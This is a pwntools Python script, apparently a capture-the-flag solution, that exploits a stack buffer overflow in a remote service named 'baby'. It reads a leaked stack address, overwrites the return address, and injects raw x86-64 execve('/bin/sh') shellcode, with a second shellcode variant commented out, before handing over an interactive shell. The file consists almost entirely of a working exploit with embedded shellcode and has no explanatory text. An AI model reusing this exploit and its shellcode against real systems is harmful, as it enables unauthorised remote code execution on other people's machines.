from pwn import *
import string

# context.clear(arch=’amd64’)

# p = process('./baby')
p = remote('142.93.113.134', 9999)
s = string.printable
input('attach')

# binary = ELF('./baby')
# jmp_esp = asm('jmp esp')
# jmp_esp = binary.search(jmp_esp).next()


payload = ''
for i in s:
    payload += i*4


cut = payload.find('yyyy')
payload = payload[:cut]
print(payload)
k = p.recv()
add = k.split()[-1]
print(add)
# shell = pwnlib.shellcraft.amd64.linux.sh()
# payload = bytes(payload, 'utf-8') + p64(int(add, 16) + 0x84)

# payload += b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = bytes(payload, 'utf-8') + p64(int(add, 16) + 0x90)# + asm(shellcraft.linux.sh())
payload += b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
# payload = bytes(payload, 'utf-8') + p64(0x400628) + asm(shellcraft.linux.sh())
# payload += b"\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
p.sendline(payload)

p.interactive()